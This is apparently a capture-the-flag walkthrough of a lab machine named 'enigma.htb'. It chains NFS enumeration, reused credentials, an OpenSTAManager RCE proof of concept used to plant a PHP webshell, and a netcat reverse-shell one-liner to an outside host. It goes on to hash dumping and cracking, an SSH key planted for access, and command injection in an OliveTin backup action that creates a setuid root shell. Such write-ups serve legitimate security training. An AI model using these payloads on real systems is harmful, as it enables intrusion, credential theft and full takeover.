### Nmap
```
nmap -sV -sC -vv 10.129.35.133

---OUTPUT---
Nmap scan report for 10.129.35.133
Host is up, received echo-reply ttl 63 (0.032s latency).
Scanned at 2026-06-29 08:56:41 EDT for 17s
Not shown: 992 closed tcp ports (reset)
PORT     STATE SERVICE  REASON         VERSION
22/tcp   open  ssh      syn-ack ttl 63 OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBN9Ju3bTZsFozwXY1B2KIlEY4BA+RcNM57w4C5EjOw1QegUUyCJoO4TVOKfzy/9kd3WrPEj/FYKT2agja9/PM44=
|   256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIH9qI0OvMyp03dAGXR0UPdxw7hjSwMR773Yb9Sne+7vD
80/tcp   open  http     syn-ack ttl 63 nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://enigma.htb/
110/tcp  open  pop3     syn-ack ttl 63 Dovecot pop3d
|_pop3-capabilities: RESP-CODES CAPA PIPELINING UIDL TOP STLS AUTH-RESP-CODE SASL
| ssl-cert: Subject: commonName=enigma
| Subject Alternative Name: DNS:enigma
| Issuer: commonName=enigma
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-02-18T20:33:33
| Not valid after:  2036-02-16T20:33:33
| MD5:     8361 ca20 2e4e dff6 6e90 1445 7458 9fc3
| SHA-1:   9f91 b6ed 85b4 517c 0421 c62e 167d 5631 daa6 5a40
| SHA-256: 98a8 1f62 b59c 832a 162e 2394 9e41 1e08 46a0 f7c1 529f afcb ea15 eea5 ef52 bb70
| -----BEGIN CERTIFICATE-----
| MIIC7zCCAdegAwIBAgIUDIVPMnvnZ7MqOX9P3XD6FaMUGLYwDQYJKoZIhvcNAQEL
| BQAwETEPMA0GA1UEAwwGZW5pZ21hMB4XDTI2MDIxODIwMzMzM1oXDTM2MDIxNjIw
| MzMzM1owETEPMA0GA1UEAwwGZW5pZ21hMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A
| MIIBCgKCAQEAkSnxU+24XgWM3KXxLy4mCk7AclfQyAQlcr8Gm7L3E3gdkF74wSZy
| i00pixUHKlKqrPQwSpNqsWMqi1ggBZQzd2jBRKzpQQflMUzI8uoUjkBlaFqKCli5
| cJgyL/WcOylWDTdBXeIyBUBDN1duzVa/BDTV83inPH+Fs5rpesSJ/Jwsv4432dtb
| SGAe6YuR4PIpgI33GvPoW3uSfE/yMGffwRf0RONTcsbsNC8reb3XKqa9eNfrmYb3
| S9/L/3dK04fZRU1gk4vRt0xY60VSgQXJqQwfsTUxcNqwYL0bZ0u5bEfV6ITwNO5F
| DZ11EkqkJCFx6pVgWRmnfC0XNMi5IHW3mwIDAQABoz8wPTAJBgNVHRMEAjAAMBEG
| A1UdEQQKMAiCBmVuaWdtYTAdBgNVHQ4EFgQUHA8z2wPX5Qj2TV6SafL8f2LRoDsw
| DQYJKoZIhvcNAQELBQADggEBADr3VEq/+YzDltVRbBvjGeCCm2A2+5nAniEJE/oA
| CkQDVHgYrMH/7L0z0kocq0e54Mk+iRRPKjP4bF4FhG2syeaE2o1aqH6C3GIoBvRZ
| 79XCkgxf5XDlECId1en+KS+iX2ssSmFWEU7l9+OnIRY1QA91OekD2OznIfAeXjaw
| O4SWzae1MrGM0venQ1RugTWa9JoL6G2BUtqIGDyw3QRxmx3HKStMtfHqdq2vzFjA
| LsK4A5j7mMDujaq55Nsc4/Su0ShQKPW3A1X7C1Y9c492g9Z0R5GL17CrmYJIVPX2
| +LC3TWgrRUQ6i5qZ7/9jU198FGNUlRGQi304f+XlxhVqTHI=
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
111/tcp  open  rpcbind  syn-ack ttl 63 2-4 (RPC #100000)
|_rpcinfo: ERROR: Script execution failed (use -d to debug)
143/tcp  open  imap     syn-ack ttl 63 Dovecot imapd (Ubuntu)
|_imap-capabilities: ID more have LOGIN-REFERRALS listed OK ENABLE LOGINDISABLEDA0001 IMAP4rev1 Pre-login IDLE LITERAL+ STARTTLS post-login capabilities SASL-IR
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=enigma
| Subject Alternative Name: DNS:enigma
| Issuer: commonName=enigma
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-02-18T20:33:33
| Not valid after:  2036-02-16T20:33:33
| MD5:     8361 ca20 2e4e dff6 6e90 1445 7458 9fc3
| SHA-1:   9f91 b6ed 85b4 517c 0421 c62e 167d 5631 daa6 5a40
| SHA-256: 98a8 1f62 b59c 832a 162e 2394 9e41 1e08 46a0 f7c1 529f afcb ea15 eea5 ef52 bb70
| -----BEGIN CERTIFICATE-----
| MIIC7zCCAdegAwIBAgIUDIVPMnvnZ7MqOX9P3XD6FaMUGLYwDQYJKoZIhvcNAQEL
| BQAwETEPMA0GA1UEAwwGZW5pZ21hMB4XDTI2MDIxODIwMzMzM1oXDTM2MDIxNjIw
| MzMzM1owETEPMA0GA1UEAwwGZW5pZ21hMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A
| MIIBCgKCAQEAkSnxU+24XgWM3KXxLy4mCk7AclfQyAQlcr8Gm7L3E3gdkF74wSZy
| i00pixUHKlKqrPQwSpNqsWMqi1ggBZQzd2jBRKzpQQflMUzI8uoUjkBlaFqKCli5
| cJgyL/WcOylWDTdBXeIyBUBDN1duzVa/BDTV83inPH+Fs5rpesSJ/Jwsv4432dtb
| SGAe6YuR4PIpgI33GvPoW3uSfE/yMGffwRf0RONTcsbsNC8reb3XKqa9eNfrmYb3
| S9/L/3dK04fZRU1gk4vRt0xY60VSgQXJqQwfsTUxcNqwYL0bZ0u5bEfV6ITwNO5F
| DZ11EkqkJCFx6pVgWRmnfC0XNMi5IHW3mwIDAQABoz8wPTAJBgNVHRMEAjAAMBEG
| A1UdEQQKMAiCBmVuaWdtYTAdBgNVHQ4EFgQUHA8z2wPX5Qj2TV6SafL8f2LRoDsw
| DQYJKoZIhvcNAQELBQADggEBADr3VEq/+YzDltVRbBvjGeCCm2A2+5nAniEJE/oA
| CkQDVHgYrMH/7L0z0kocq0e54Mk+iRRPKjP4bF4FhG2syeaE2o1aqH6C3GIoBvRZ
| 79XCkgxf5XDlECId1en+KS+iX2ssSmFWEU7l9+OnIRY1QA91OekD2OznIfAeXjaw
| O4SWzae1MrGM0venQ1RugTWa9JoL6G2BUtqIGDyw3QRxmx3HKStMtfHqdq2vzFjA
| LsK4A5j7mMDujaq55Nsc4/Su0ShQKPW3A1X7C1Y9c492g9Z0R5GL17CrmYJIVPX2
| +LC3TWgrRUQ6i5qZ7/9jU198FGNUlRGQi304f+XlxhVqTHI=
|_-----END CERTIFICATE-----
993/tcp  open  ssl/imap syn-ack ttl 63 Dovecot imapd (Ubuntu)
|_imap-capabilities: ID more LOGIN-REFERRALS listed OK ENABLE have IMAP4rev1 SASL-IR IDLE AUTH=PLAINA0001 Pre-login post-login capabilities LITERAL+
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=enigma
| Subject Alternative Name: DNS:enigma
| Issuer: commonName=enigma
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-02-18T20:33:33
| Not valid after:  2036-02-16T20:33:33
| MD5:     8361 ca20 2e4e dff6 6e90 1445 7458 9fc3
| SHA-1:   9f91 b6ed 85b4 517c 0421 c62e 167d 5631 daa6 5a40
| SHA-256: 98a8 1f62 b59c 832a 162e 2394 9e41 1e08 46a0 f7c1 529f afcb ea15 eea5 ef52 bb70
| -----BEGIN CERTIFICATE-----
| MIIC7zCCAdegAwIBAgIUDIVPMnvnZ7MqOX9P3XD6FaMUGLYwDQYJKoZIhvcNAQEL
| BQAwETEPMA0GA1UEAwwGZW5pZ21hMB4XDTI2MDIxODIwMzMzM1oXDTM2MDIxNjIw
| MzMzM1owETEPMA0GA1UEAwwGZW5pZ21hMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A
| MIIBCgKCAQEAkSnxU+24XgWM3KXxLy4mCk7AclfQyAQlcr8Gm7L3E3gdkF74wSZy
| i00pixUHKlKqrPQwSpNqsWMqi1ggBZQzd2jBRKzpQQflMUzI8uoUjkBlaFqKCli5
| cJgyL/WcOylWDTdBXeIyBUBDN1duzVa/BDTV83inPH+Fs5rpesSJ/Jwsv4432dtb
| SGAe6YuR4PIpgI33GvPoW3uSfE/yMGffwRf0RONTcsbsNC8reb3XKqa9eNfrmYb3
| S9/L/3dK04fZRU1gk4vRt0xY60VSgQXJqQwfsTUxcNqwYL0bZ0u5bEfV6ITwNO5F
| DZ11EkqkJCFx6pVgWRmnfC0XNMi5IHW3mwIDAQABoz8wPTAJBgNVHRMEAjAAMBEG
| A1UdEQQKMAiCBmVuaWdtYTAdBgNVHQ4EFgQUHA8z2wPX5Qj2TV6SafL8f2LRoDsw
| DQYJKoZIhvcNAQELBQADggEBADr3VEq/+YzDltVRbBvjGeCCm2A2+5nAniEJE/oA
| CkQDVHgYrMH/7L0z0kocq0e54Mk+iRRPKjP4bF4FhG2syeaE2o1aqH6C3GIoBvRZ
| 79XCkgxf5XDlECId1en+KS+iX2ssSmFWEU7l9+OnIRY1QA91OekD2OznIfAeXjaw
| O4SWzae1MrGM0venQ1RugTWa9JoL6G2BUtqIGDyw3QRxmx3HKStMtfHqdq2vzFjA
| LsK4A5j7mMDujaq55Nsc4/Su0ShQKPW3A1X7C1Y9c492g9Z0R5GL17CrmYJIVPX2
| +LC3TWgrRUQ6i5qZ7/9jU198FGNUlRGQi304f+XlxhVqTHI=
|_-----END CERTIFICATE-----
995/tcp  open  ssl/pop3 syn-ack ttl 63 Dovecot pop3d
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=enigma
| Subject Alternative Name: DNS:enigma
| Issuer: commonName=enigma
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-02-18T20:33:33
| Not valid after:  2036-02-16T20:33:33
| MD5:     8361 ca20 2e4e dff6 6e90 1445 7458 9fc3
| SHA-1:   9f91 b6ed 85b4 517c 0421 c62e 167d 5631 daa6 5a40
| SHA-256: 98a8 1f62 b59c 832a 162e 2394 9e41 1e08 46a0 f7c1 529f afcb ea15 eea5 ef52 bb70
| -----BEGIN CERTIFICATE-----
| MIIC7zCCAdegAwIBAgIUDIVPMnvnZ7MqOX9P3XD6FaMUGLYwDQYJKoZIhvcNAQEL
| BQAwETEPMA0GA1UEAwwGZW5pZ21hMB4XDTI2MDIxODIwMzMzM1oXDTM2MDIxNjIw
| MzMzM1owETEPMA0GA1UEAwwGZW5pZ21hMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A
| MIIBCgKCAQEAkSnxU+24XgWM3KXxLy4mCk7AclfQyAQlcr8Gm7L3E3gdkF74wSZy
| i00pixUHKlKqrPQwSpNqsWMqi1ggBZQzd2jBRKzpQQflMUzI8uoUjkBlaFqKCli5
| cJgyL/WcOylWDTdBXeIyBUBDN1duzVa/BDTV83inPH+Fs5rpesSJ/Jwsv4432dtb
| SGAe6YuR4PIpgI33GvPoW3uSfE/yMGffwRf0RONTcsbsNC8reb3XKqa9eNfrmYb3
| S9/L/3dK04fZRU1gk4vRt0xY60VSgQXJqQwfsTUxcNqwYL0bZ0u5bEfV6ITwNO5F
| DZ11EkqkJCFx6pVgWRmnfC0XNMi5IHW3mwIDAQABoz8wPTAJBgNVHRMEAjAAMBEG
| A1UdEQQKMAiCBmVuaWdtYTAdBgNVHQ4EFgQUHA8z2wPX5Qj2TV6SafL8f2LRoDsw
| DQYJKoZIhvcNAQELBQADggEBADr3VEq/+YzDltVRbBvjGeCCm2A2+5nAniEJE/oA
| CkQDVHgYrMH/7L0z0kocq0e54Mk+iRRPKjP4bF4FhG2syeaE2o1aqH6C3GIoBvRZ
| 79XCkgxf5XDlECId1en+KS+iX2ssSmFWEU7l9+OnIRY1QA91OekD2OznIfAeXjaw
| O4SWzae1MrGM0venQ1RugTWa9JoL6G2BUtqIGDyw3QRxmx3HKStMtfHqdq2vzFjA
| LsK4A5j7mMDujaq55Nsc4/Su0ShQKPW3A1X7C1Y9c492g9Z0R5GL17CrmYJIVPX2
| +LC3TWgrRUQ6i5qZ7/9jU198FGNUlRGQi304f+XlxhVqTHI=
|_-----END CERTIFICATE-----
|_pop3-capabilities: RESP-CODES CAPA PIPELINING UIDL TOP USER AUTH-RESP-CODE SASL(PLAIN)
2049/tcp open  nfs      syn-ack ttl 63 3-4 (RPC #100003)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

![[Pasted image 20260629085831.png]]

- Looking at the nmap scan I see an nfs share is at port 2049. 
- I mounted the share with the following commands:
- First I found the share name:
```
showmount -e 10.129.35.133

---OUTPUT---
Export list for 10.129.35.133:
/srv/nfs/onboarding *
```
![[Pasted image 20260630072743.png]]
- Then I created a share folder in `/mnt`:
```
sudo mkdir /mnt/nfs
```
- Finally I mounted the share:
```
sudo mount -t nfs 10.129.35.133:/srv/nfs/onboarding /mnt/nfs
```
- I find a pdf `New_Employee_Access.pdf` in the share:
![[Pasted image 20260630072826.png]]

- On reading it I find details of a subdomain url `mail002.enigma.htb` and some credentials for a new user:
```
open New_Employee_Access.pdf
```
![[Pasted image 20260630072921.png]]

- Going to the url and logging in with the credentials I find an email from `sarah`. Other than that I couldn't find anything useful. 
![[Pasted image 20260630073205.png]]
![[Pasted image 20260630073352.png]]

- I reuse the same password for Sarah's account onto the Roundcube webmail website and get a hit. Looking in it I find some more credentials and a new url link `support_001.enigma.htb`
![[Pasted image 20260630073508.png]]

- Navigating to that website I log in to  OpenSTAManager with the credentials `admin`:`Ne3s4rtars78s`
![[Pasted image 20260630073607.png]]
![[Pasted image 20260630073623.png]]

- Looking online I find OpenSTAManager is vulnerable to an RCE exploit which basically uploads a zip file where the file is a p7m file that when naming it in a certain way can be used to pass commands through SQL injection. The CVE is `CVE-2025-69212` with a PoC from this url:  https://github.com/lukasz-rybak/CVE-2025-69212

- Using this exploit I create a very simple webshell with the following command:
```
python3 exploit2.py  -u http://support_001.enigma.htb -c u2l5k2rg8v6b55h0vj5kv90pk0 \ 
  -cmd 'cd files && echo "<?php system(\$_GET[\"c\"]); ?>" > rce.php'
  
---OUTPUT---
/home/kali/Documents/HTB/Active/Enigma/exploit2.py:118: SyntaxWarning: invalid escape sequence '\$'
  -cmd "cd files && echo '<?php system(\$_GET[\"c\"]); ?>' > shell.php"

╔═══════════════════════════════════════════════════════════════╗
║       CVE-2025-69212 - OpenSTAManager RCE POC                 ║
║   OpenSTAManager <= 2.9.8 - Command Injection in P7M Handler  ║
╚═══════════════════════════════════════════════════════════════╝
    
[*] Uploading malicious ZIP...
[*] Target: http://support_001.enigma.htb/actions.php
[*] Command: cd files && echo "<?php system(\$_GET[\"c\"]); ?>" > rce.php
[*] Status Code: 500
[+] Got 500 error (expected - command likely executed)
[+] Check if shell.php exists at /files/SHELL.php

[+] Exploit completed!
[*] If shell creation was the command, access: /files/shell.php?c=id
```
- Note that I grab the PHPSESID either via DevTools in browser or via curl:
- Via Devtools : Press F12 and goto Storage to find it:
![[Pasted image 20260630074206.png]]
- Via curl;
```
---COMMAND-1---
curl -s -c /tmp/cookies.txt -b /tmp/cookies.txt \
  -X POST http://support_001.enigma.htb/index.php \
  -d "username=admin&password=Ne3s4rtars78s" -L
  
---COMMAND-2---
grep PHPSESSID /tmp/cookies.txt | awk '{print $NF}'
```

- Browsing and testing the URL `http://support_001.enigma.htb/files/SHELL.php?c=id` I confirm the exploit worked:
![[Pasted image 20260630073920.png]]

- I then capture the packet in BurpSuite and pass the nc payload to get a shell.
- NC payload:
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.16.9 9999 >/tmp/f
```

- Payload in BurpSuite:
```
GET /files/SHELL.php?c=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|bash+-i+2>%261|nc+10.10.16.9+9999+>/tmp/f HTTP/1.1
Host: support_001.enigma.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Cookie: PHPSESSID=u2l5k2rg8v6b55h0vj5kv90pk0
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```
![[Pasted image 20260630074036.png]]

- I grab a shell on my listener:
![[Pasted image 20260630074431.png]]

- Looking around I find DB credentials `brollin`:`Fri3nds9099` in `/var/www/html/openstamanager/config.inc.php`
![[Pasted image 20260630074732.png]]

- Note I also find this from linpeas though its a bit hidden and linpeas doesnt fully run as it gets stuck eventually:
![[Pasted image 20260630074809.png]]

- SQL is a bit wonky but I manage to get the hash passwords via the commands:
```
mysql -u brollin -p
Enter password: Fri3nds@9099

> use openstamanager;
> SELECT * FROM zz_users;

--OR--
> SELECT id, username, email, password FROM zz_users;

---OUTPUTS---
id      username        password        email   idanagrafica    idgruppo        enabled created_at      updated_atreset_token      image_file_id   options
1       admin   $2y$10$rTJVUNyGGKPlhw2cFdf5AeDHVMhnIChddcHx2XxVLMQS2KsuSz4Pu    admin@enigma.htb        1       1 12026-02-18 19:26:52     2026-02-18 19:26:52     NULL    NULL
2       haris   $2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC    haris@enigma.htb        1       5 12026-02-18 20:58:28     2026-05-26 11:07:03     NULL    NULL
id      username        email   password
1       admin   admin@enigma.htb        $2y$10$rTJVUNyGGKPlhw2cFdf5AeDHVMhnIChddcHx2XxVLMQS2KsuSz4Pu
2       haris   haris@enigma.htb        $2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC
```

- Note that I don't really get output from passing the commands but only after trigerring a false error so I passed `sel;` to get an error which also printed the outputs:
![[Pasted image 20260630075120.png]]

- Finally I crack the hash for user `haris` with `john`:
```
john hash2 --wordlist=/usr/share/wordlists/rockyou.txt

---OUTPUT---
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
bestfriends      (?)     
1g 0:00:00:02 DONE (2026-06-29 11:33) 0.3937g/s 269.2p/s 269.2c/s 269.2C/s gloria..010203
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
![[Pasted image 20260630075226.png]]

- I switch to user haris (and get better shell):
```
su haris
> bestfriends

python3 -c 'import pty;pty.spawn("/bin/bash")';
```
![[Pasted image 20260630075312.png]]

- I wanted to get a better shell so I generated an ssh file and added my key to `haris`'s `authorized_keys`:
```
---ON-BOTH-TARGET-AND-LOCAL---
ssh-keygen

---COPY MY PUBLC KEY TO AUTHORIZED KEYS IN HARIS---
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIE9m94NBEsyLuVlY7ruO2le8/dPSR4C+C7G1gRXwURDp kali@kali" > authorized_keys
```

- I can ssh to haris account:
```
ssh -i ~/.ssh/id_ed25519 haris@enigma.htb
```
![[Pasted image 20260630075556.png]]

- Checking open ports I see port 1337 is open. I port forward my this to my localhost via ssh:
```
ssh -i ~/.ssh/id_ed25519 haris@enigma.htb -L 1337:127.0.0.1:1337
```
![[Pasted image 20260630075722.png]]
![[Pasted image 20260630075741.png]]

- browsing to this port on the browser I see `OliveTin` app running:
![[Pasted image 20260630075826.png]]

- playing around with it I don't find much but I do see I can input a db_pass.
- I did find a rabbit hole where I found an Argon2 hash which I cracked to be `password` for user `alice` which was apr tof a usergroup `admins` in the config file `/opt/OliveTin/OliveTin-linux-amd64/config.yaml`
![[Pasted image 20260630080002.png]]

```
hashcat -m 34000 -a 0 hash /usr/share/wordlists/rockyou.txt --force
```
![[Pasted image 20260630080041.png]]

- This didn't lead anywhere.


- On further enumeration I find multiple config files but the important one was in `/etc/OliveTin/config.yaml`
![[Pasted image 20260630080227.png]]

- This is interesting as we could escape the `password` field with `';` to then execute the commands we want.
- However we need to be able to reach the endpoint where this accepts the input.
- Looking online I find some GHSA's : https://github.com/advisories/GHSA-49gm-hh7w-wfvf
- and maybe https://github.com/advisories/GHSA-p443-p7w5-2f7f (which shows the endpoint `/api/olivetin.api.v1.OliveTinApiService/StartActionAndWait`)
- I pass a curl command and see it is reachable:
```
curl -i http://127.0.0.1:1337/api/olivetin.api.v1.OliveTinApiService/StartActionAndWait

---OUTPUT---
HTTP/1.1 405 Method Not Allowed
Allow: POST
Date: Tue, 30 Jun 2026 07:06:34 GMT
Content-Length: 0
```

- We see it's reachable but accepts only POST requests.
```
curl -i -X POST \
  http://127.0.0.1:1337/api/olivetin.api.v1.OliveTinApiService/StartActionAndWait
  
---OUTPUT---
HTTP/1.1 415 Unsupported Media Type
Accept-Post: application/grpc, application/grpc+json, application/grpc+json; charset=utf-8, application/grpc+proto, application/grpc-web, application/grpc-web+json, application/grpc-web+json; charset=utf-8, application/grpc-web+proto, application/json, application/json; charset=utf-8, application/proto
Date: Tue, 30 Jun 2026 07:07:07 GMT
Content-Length: 0
```

- it required a Media type:
```
curl -i \
  -X POST \
  http://127.0.0.1:1337/api/olivetin.api.v1.OliveTinApiService/StartActionAndWait \
  -H "Content-Type: application/json" \
  -d '{}'
  
---OUTPUT---
HTTP/1.1 200 OK
Accept-Encoding: gzip
Content-Type: application/json
Date: Tue, 30 Jun 2026 07:07:28 GMT
Content-Length: 456

{"logEntry":{"datetimeStarted":"2026-06-30 07:07:28", "actionTitle":"notfound", "output":"", "timedOut":false, "exitCode":-1337, "user":"guest", "userClass":"", "actionIcon":"&#x1f4a9;", "tags":[], "executionTrackingId":"975d8518-0810-4203-8efc-d4054ca172bb", "datetimeFinished":"2026-06-30 07:07:28", "executionStarted":false, "executionFinished":true, "blocked":false, "datetimeIndex":"3", "canKill":false, "datetimeRateLimitExpires":"", "bindingId":""}}
```
- It requried an ActionID which we saw from the config file could be `backup_database`
```
curl -i \
  -X POST \
  http://127.0.0.1:1337/api/olivetin.api.v1.OliveTinApiService/StartActionAndWait \
  -H "Content-Type: application/json" \
  -d '{
    "actionId":"backup_database"
  }'
  
---OUTPUT---
HTTP/1.1 200 OK
Accept-Encoding: gzip
Content-Type: application/json
Date: Tue, 30 Jun 2026 07:07:54 GMT
Content-Length: 506

{"logEntry":{"datetimeStarted":"2026-06-30 07:07:54", "actionTitle":"Backup Database", "output":"required arg not provided: db_user", "timedOut":false, "exitCode":-1337, "user":"guest", "userClass":"", "actionIcon":"⛁", "tags":[], "executionTrackingId":"7c4f696f-34b8-4640-b6eb-5e97c93cc9a3", "datetimeFinished":"2026-06-30 07:07:54", "executionStarted":false, "executionFinished":true, "blocked":false, "datetimeIndex":"4", "canKill":false, "datetimeRateLimitExpires":"", "bindingId":"backup_database"}}
```

- As we see it asks for some more arguments which is db_user, password etc which was also in config file:
```
curl -i \                                                                                                                                                                                                                        
  -X POST \
  http://127.0.0.1:1337/api/olivetin.api.v1.OliveTinApiService/StartActionAndWait \
  -H "Content-Type: application/json" \
  -d '{
    "actionId":"backup_database",
    "arguments":[
      {"name":"db_user","value":"backup_svc"},
      {"name":"db_pass","value":"test"},
      {"name":"db_name","value":"production"}
    ]
  }'
  
---OUTPUT---
HTTP/1.1 200 OK
Accept-Encoding: gzip
Content-Type: application/json
Date: Tue, 30 Jun 2026 07:08:37 GMT
Content-Length: 553

{"logEntry":{"datetimeStarted":"2026-06-30 07:08:37", "actionTitle":"Backup Database", "output":"exit status 2\n\nsh: 1: cannot create /opt/backups/backup.sql: Directory nonexistent\n", "timedOut":false, "exitCode":2, "user":"guest", "userClass":"", "actionIcon":"⛁", "tags":[], "executionTrackingId":"62901ab6-0344-4f15-b996-619aca55250a", "datetimeFinished":"2026-06-30 07:08:37", "executionStarted":true, "executionFinished":true, "blocked":false, "datetimeIndex":"5", "canKill":false, "datetimeRateLimi
```

- We see it seems to be working. So let's try our exploit. Initially I tried a reverse shell payload but it seemed to crash right after catching a root shell.
- So I attempted to change the bash file to be executable as haris:
```
curl -i \
  -X POST \
  http://127.0.0.1:1337/api/olivetin.api.v1.OliveTinApiService/StartActionAndWait \
  -H "Content-Type: application/json" \
  -d '{
    "actionId":"backup_database",
    "arguments":[
      {"name":"db_user","value":"backup_svc"},
      {"name":"db_pass","value":"x'\''; cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash; #"},
      {"name":"db_name","value":"production"}
    ]
  }'

---OUTPUT---
HTTP/1.1 200 OK
Accept-Encoding: gzip
Content-Type: application/json
Date: Tue, 30 Jun 2026 07:12:39 GMT
Content-Length: 761

{"logEntry":{"datetimeStarted":"2026-06-30 07:12:39", "actionTitle":"Backup Database", "output":"mysqldump: [Warning] Using a password on the command line interface can be insecure.\nUsage: mysqldump [OPTIONS] database [tables]\nOR     mysqldump [OPTIONS] --databases [OPTIONS] DB1 [DB2 DB3...]\nOR     mysqldump [OPTIONS] --all-databases [OPTIONS]\nFor more options, use mysqldump --help\n", "timedOut":false, "exitCode":0, "user":"guest", "userClass":"", "actionIcon":"⛁", "tags":[], "executionTrackingId":"940f764c-12e0-4ac1-a714-01ce1ef0d6cd", "datetimeFinished":"2026-06-30 07:12:39", "executionStarted":true, "executionFinished":true, "blocked":false, "datetimeIndex":"10", "canKill":false, "datetimeRateLimitExpires":"", "bindingId":"backup_database"}}
```
- Just FYI the main payload is in `db_pass` field :
```
x'\''; cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash; #
```

- Checking `/tmp` folder I see `rootbash`:
![[Pasted image 20260630081318.png]]

- I then run it with the `-p` argument to gain a shell with root privileges:
```
/tmp/rootbash -p
```
![[Pasted image 20260630081354.png]]

- I grab the root flag:
![[Pasted image 20260630081416.png]]

- I also grabbed the user flag as user haris earlier:
![[Pasted image 20260630081539.png]]